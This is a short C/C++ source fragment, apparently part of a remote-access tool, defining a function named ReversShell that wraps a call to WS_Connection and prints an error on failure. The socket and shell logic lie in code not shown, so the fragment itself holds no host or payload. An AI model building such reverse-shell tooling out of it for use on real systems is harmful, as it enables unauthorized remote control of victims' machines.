#include "pa5a.hpp"

EXTERN_C_START

BOOL ReversShell()
{

    if (WS_Connection() == FALSE)
    {
        printf("Failed to initiate connection with the server\n");
        return FALSE;
    }
    
    return TRUE;
}

EXTERN_C_END